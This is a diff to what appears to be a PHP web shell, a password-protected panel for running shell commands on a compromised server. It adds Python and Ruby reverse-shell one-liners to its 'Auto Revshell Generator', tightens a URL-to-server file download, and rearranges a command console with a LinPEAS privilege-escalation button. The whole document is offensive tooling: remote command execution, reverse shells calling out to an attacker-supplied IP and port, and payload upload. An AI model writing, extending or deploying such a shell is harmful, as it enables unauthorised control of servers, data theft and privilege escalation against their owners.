@@ -7,6 +7,7 @@ ini_set('zlib.output_compression', 0);
 while (ob_get_level())
     ob_end_flush();
 ob_implicit_flush(1);
+error_reporting(E_ALL & ~E_WARNING);
 
 // ?   PROTECTED LOGIN START
 $MASTER_PASSWORD = 'yourStrongMasterPasswordHere';
@@ -413,7 +414,7 @@ $services = [
     'Python' => [
         'status' => check_install('python --help', 'usage: python', $available_ce_methods),
         'version' => get_regex_version('python --version 2>&1', '/Python\s+([\d.]+)/', $available_ce_methods),
-        'shell' => 'a'
+        'shell' => 'export RHOST="IP";export RP=PORT;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RP"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\''
     ],
     'PHP' => [
         'status' => check_install('php --help', 'Usage: php', $available_ce_methods),
@@ -428,7 +429,7 @@ $services = [
     'Ruby' => [
         'status' => check_install('ruby --help', 'ruby [switches]', $available_ce_methods),
         'version' => get_regex_version('ruby --version 2>&1', '/ruby\s+([\d\.]+)p\d+/', $available_ce_methods),
-        'shell' => 'a'
+        'shell' => 'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("IP",PORT))\''
     ],
     'bash' => [
         'status' => check_install('bash --version', 'GNU bash,', $available_ce_methods),
@@ -490,12 +491,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile']) && iss
 if ($_SERVER['REQUEST_METHOD'] === 'GET' &&
         isset($_GET['urlUpload'], $_GET['urlUploadName'], $_GET['uploadPath'])) {
     /* UPLOAD FILE WITH CURL */
-
+    ob_start();
     header('Content-Type: application/json');
 
     $uploadPath = realpath($_GET['uploadPath']);
     if (!$uploadPath || !is_dir($uploadPath)) {
         echo json_encode(['success' => false, 'error' => 'Invalid upload path']);
+        exit;
+    }
+
+    if(!is_writable($uploadPath)){
+        echo json_encode(['success' => false, 'error' => 'Upload path not writable']);
         exit;
     }
 
@@ -506,16 +512,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' &&
     // Initialize cURL to download the file
     $ch = curl_init($url);
     $fp = fopen($destination, 'wb');
+    if (!$fp) {
+        echo json_encode(['success' => false, 'error' => "Failed to open destination file"]);
+        exit;
+    }
     curl_setopt($ch, CURLOPT_FILE, $fp);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_FAILONERROR, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLINFO_HEADER_OUT, true);
     $success = curl_exec($ch);
     $curlErr = curl_error($ch);
     curl_close($ch);
     fclose($fp);
 
-    if ($success) {
+    ob_clean();
+
+    if ($success && file_exists($destination) && filesize($destination) > 0) {
         echo json_encode(['success' => true]);
     } else {
         // Remove incomplete file
@@ -708,6 +722,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
             grid-row: span 2;
             /* max-height: 50vh; */
         }
+        .span-row-4 {
+            grid-row: span 4;
+        }
 
         .flex-row{
             display: inline-flex; 
@@ -833,6 +850,34 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
     <div id="loading-overlay" style="display:none;">Dumping folder... (This will take a long time. Go make some coffee or take a shit...)</div>
     <a class="btn-red" style="position:absolute; right:10px; top:0; width: 100px; text-align:center" href="?logout=True">Log&nbsp;Out</a>
     <div class="grid">
+        <div  style="gap: 0px;align-items: stretch;" class="card span-row-4 flex-column">
+            <div class="card">
+                <div class="flex-row">
+                    <label for="cmdMethod">Execute&nbsp;As:</label>
+                    <select id="cmdMethod">
+                    <?php foreach ($available_ce_methods as $method): ?>
+                        <option value="<?= htmlspecialchars($method) ?>"><?= htmlspecialchars($method) ?></option>
+                    <?php endforeach; ?>
+                    </select>
+                    <label for="cmdInputColors">
+                        ANSI&nbsp;Colors:
+                    </label>
+                    <input style="width: auto" type="checkbox" id="cmdInputColors" checked>
+                    <label>Quick&nbsp;Commands:</label>
+                    <button class="btn" onclick="executeShellCommand('./linpeas.sh > linpeas_out.txt 2>&1', true)">Run&nbsp;LinPEAS</button>
+                    <?php echo is_in_docker(); ?>
+                </div>
+            </div>
+            <div class="card" style="flex-grow: 1; display: flex; flex-direction: column; overflow: hidden">
+                <div class="flex-row" style="width: 100%">
+                    <label style="text-wrap:nowrap" for="cmdInput">
+                        <span style="color:#0f0"><?php echo execute_command('whoami', $available_ce_methods) ?><span style="color:white">@</span><?php echo execute_command('hostname', $available_ce_methods) ?></span>:<span style="color:#4d90fe" class="selectedPath">/</span>$
+                    </label>
+                    <input type="text" id="cmdInput" placeholder="Enter shell command">
+                </div>
+                <pre id="cmdOutput"></pre>
+            </div>
+        </div>
         <div class="card">
             <!-- Services, Auto Revshell Generator -->
             <div class="card">
@@ -895,34 +940,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                 <!-- <button class="btn">Clean&nbsp;Up</button> Still have to figure this one out -->
             </div>
         </div>
-        <div  style="gap: 0px;align-items: stretch;" class="card span-column span-row flex-column">
-            <div class="card">
-                <div class="flex-row">
-                    <label for="cmdMethod">Execute&nbsp;As:</label>
-                    <select id="cmdMethod">
-                    <?php foreach ($available_ce_methods as $method): ?>
-                        <option value="<?= htmlspecialchars($method) ?>"><?= htmlspecialchars($method) ?></option>
-                    <?php endforeach; ?>
-                    </select>
-                    <label for="cmdInputColors">
-                        ANSI&nbsp;Colors:
-                    </label>
-                    <input style="width: auto" type="checkbox" id="cmdInputColors" checked>
-                    <label>Quick&nbsp;Commands:</label>
-                    <button class="btn" onclick="executeShellCommand('./linpeas.sh > linpeas_out.txt 2>&1')">Run&nbsp;LinPEAS</button>
-                    <?php echo is_in_docker(); ?>
-                </div>
-            </div>
-            <div class="card" style="flex-grow: 1; display: flex; flex-direction: column; overflow: hidden">
-                <div class="flex-row" style="width: 100%">
-                    <label style="text-wrap:nowrap" for="cmdInput">
-                        <span style="color:#0f0"><?php echo execute_command('whoami', $available_ce_methods) ?><span style="color:white">@</span><?php echo execute_command('hostname', $available_ce_methods) ?></span>:<span style="color:#4d90fe" class="selectedPath">/</span>$
-                    </label>
-                    <input type="text" id="cmdInput" placeholder="Enter shell command">
-                </div>
-                <pre id="cmdOutput"></pre>
-            </div>
-        </div>
     </div>
 </body>
 
@@ -935,7 +952,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
         }
     });
 
-    function executeShellCommand(cmd) {
+    function executeShellCommand(cmd, linpeas) {
         if (!cmd.trim()) return;
 
         const cmdOutputEl = document.getElementById('cmdOutput');
@@ -943,6 +960,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
         const pathEl = document.getElementsByClassName('selectedPath')[0];
         const path = pathEl?.value || '/';
         const ansiColors = document.getElementById('cmdInputColors').checked;
+
+        if (linpeas){
+            cmdOutputEl.textContent = "Starting Linpeas. This will take some time..." + cmdOutputEl.textContent;
+        }
 
         // Handle 'clear' locally
         if (cmd === 'clear') {
@@ -967,7 +988,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                 ? `${timestamp} $ ${cmd}\n${data.output.trim()}\n\n`
                 : `${timestamp} $ ${cmd}\nError: ${data.error}\n\n`;
 
-            if (ansiColors) {
+            if (linpeas){
+                cmdOutputEl.textContent = "File linpeas_out.txt created." + cmdOutputEl.textContent;
+            }
+            else if (ansiColors) {
                 cmdOutputEl.innerHTML = output + cmdOutputEl.innerHTML;
             } else {
                 cmdOutputEl.textContent = output + cmdOutputEl.textContent;
